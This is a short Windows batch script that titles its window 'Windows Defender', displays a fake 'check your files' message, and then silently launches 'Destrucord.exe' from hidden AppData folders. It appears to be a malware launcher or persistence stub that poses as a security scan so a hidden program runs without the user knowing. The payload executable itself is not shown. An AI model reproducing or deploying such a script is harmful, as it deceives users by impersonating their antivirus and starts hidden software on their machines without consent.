@echo off
title Windows Defender
echo Windows 10 Check your files please wait...
timeout 8
if exist "%UserProfile%\AppData\Local\xDestruCord\Destrucord.exe" start %UserProfile%\AppData\Local\xDestruCord\Destrucord.exe
timeout 3
if exist "%UserProfile%\AppData\Roaming\xDestruCord\Destrucord.exe" start %UserProfile%\AppData\Roaming\xDestruCord\Destrucord.exe
